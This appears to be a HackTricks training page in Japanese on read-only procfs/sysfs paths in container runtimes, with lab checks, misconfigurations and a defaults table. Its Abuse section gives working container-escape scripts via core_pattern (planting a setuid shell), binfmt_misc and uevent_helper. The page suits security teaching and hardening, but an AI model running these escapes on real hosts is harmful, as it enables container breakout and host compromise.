# Read-Only System Paths

{{#include ../../../../banners/hacktricks-training.md}}

Read-Only System Paths は、masked paths とは別の protection です。path を完全に隠す代わりに、runtime はその path を公開したまま read-only で mount します。これは、read access は許容できる、または運用上必要である一方、write は危険すぎる selected procfs および sysfs locations で一般的に使用されます。

目的は明確です。多くの kernel interfaces は writable になると、はるかに危険になります。read-only mount はすべての reconnaissance value を排除するわけではありませんが、compromised workload がその path を介して underlying kernel-facing files を変更することを防ぎます。

## Operation

Runtime は、proc/sys view の一部を read-only として設定することがよくあります。runtime と host によって異なりますが、以下のような paths が含まれる場合があります。

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

実際のリストは異なりますが、model は同じです。必要な場所では visibility を許可し、デフォルトで mutation を拒否します。

## Lab

Docker が宣言した read-only path list を確認します。
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
コンテナ内部から、マウントされた proc/sys ビューを確認します：
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## セキュリティへの影響

読み取り専用のシステムパスにより、ホストに影響を与える広範な種類の悪用を抑制できます。攻撃者が procfs や sysfs を検査できる場合でも、そこへの書き込みができなければ、kernel tunables、crash handlers、module-loading helpers、その他の control interfaces に関わる直接的な変更経路の多くが排除されます。exposure がなくなるわけではありませんが、information disclosure からホストへの影響に移行することはより困難になります。

## Misconfigurations

主なミスは、機密性の高いパスの mask を解除したり read-write で remount したりすること、書き込み可能な bind mounts を使ってホストの proc/sys の内容を直接公開すること、またはより安全な runtime defaults を事実上回避する privileged modes を使用することです。Kubernetes では、`procMount: Unmasked` と privileged workloads が、より弱い proc protection と併用されることがよくあります。もう1つの一般的な運用上のミスは、runtime が通常これらのパスを read-only で mount しているからといって、すべての workloads がその default を引き継いでいると考えてしまうことです。

## Abuse

この protection が弱い場合は、まず書き込み可能な proc/sys entries を探します。
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
書き込み可能なエントリが存在する場合、価値の高い追加調査の経路としては、
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
これらのコマンドから判明すること：

- `/proc/sys` 配下の書き込み可能なエントリは、container が単に検査できるだけでなく、host の kernel の動作を変更できることを示す場合が多い。
- `core_pattern` は特に重要である。host 側から見える値が書き込み可能な場合、pipe handler を設定した後に process を crash させることで、host code-execution path に変えることができる。
- `modprobe` は、module-loading 関連の処理で kernel が使用する helper を示す。書き込み可能な場合、典型的な高価値 target となる。
- `binfmt_misc` は、custom interpreter の登録が可能かどうかを示す。登録が書き込み可能な場合、単なる情報 leak ではなく execution primitive になり得る。
- `panic_on_oom` は host 全体に関わる kernel の判断を制御するため、resource exhaustion を host denial of service に変える可能性がある。
- `uevent_helper` は、書き込み可能な sysfs helper path によって host context での実行が発生する、最も分かりやすい例の一つである。

注目すべき発見には、通常は read-only であるべき、host 側から見える proc knob や sysfs entry が書き込み可能になっているケースが含まれる。その時点で、workload は制限された container view から、意味のある kernel influence へと移行している。

### Full Example: `core_pattern` Host Escape

`/proc/sys/kernel/core_pattern` が container 内から書き込み可能で、host kernel view を参照している場合、crash 後に payload を実行するために悪用できる：
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
パスが実際にホストカーネルに到達する場合、payloadはホスト上で実行され、setuid shellを残します。

### 完全な例: `binfmt_misc` Registration

`/proc/sys/fs/binfmt_misc/register` が書き込み可能な場合、一致するファイルが実行されたときに、カスタムインタープリターのRegistrationによってcode executionが発生する可能性があります:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
ホストに公開された書き込み可能な `binfmt_misc` では、結果として kernel-triggered interpreter path での code execution が発生します。

### 完全な例: `uevent_helper`

`/sys/kernel/uevent_helper` が書き込み可能な場合、一致する event が trigger されたとき、kernel が host-path helper を invoke する可能性があります:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
これが非常に危険なのは、helper path が安全なコンテナ専用のコンテキストではなく、host filesystem の観点から解決されるためです。

## チェック

これらのチェックでは、procfs/sysfs の公開が想定どおり read-only かどうか、およびワークロードが依然として機密性の高い kernel interface を変更できるかどうかを確認します。
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
ここで注目すべき点：

- 通常の hardened workload では、書き込み可能な proc/sys エントリはごく少数であるべきです。
- 書き込み可能な `/proc/sys` パスは、通常の読み取りアクセスより重要な場合がよくあります。
- runtime があるパスを read-only と示しているにもかかわらず、実際には書き込み可能な場合は、mount propagation、bind mounts、privilege 設定を慎重に確認してください。

## ランタイムのデフォルト

| Runtime / platform | デフォルト状態 | デフォルトの動作 | よくある手動での弱体化 |
| --- | --- | --- | --- |
| Docker Engine | デフォルトで有効 | Docker は、機密性の高い proc エントリ向けにデフォルトの read-only パスリストを定義します | host の proc/sys mounts の公開、`--privileged` |
| Podman | デフォルトで有効 | Podman は、明示的に緩和されない限り、デフォルトの read-only paths を適用します | `--security-opt unmask=ALL`、広範な host mounts、`--privileged` |
| Kubernetes | runtime のデフォルトを継承 | Pod 設定または host mounts によって弱体化されない限り、基盤となる runtime の read-only path model を使用します | `procMount: Unmasked`、privileged workloads、書き込み可能な host proc/sys mounts |
| containerd / CRI-O under Kubernetes | runtime のデフォルト | 通常は OCI/runtime のデフォルトに依存します | Kubernetes の行と同じ。直接の runtime 設定変更によって動作が弱体化する可能性があります |

重要な点は、read-only system paths は通常 runtime のデフォルトとして設定されていますが、privileged modes や host bind mounts によって簡単に無効化できることです。
{{#include ../../../../banners/hacktricks-training.md}}
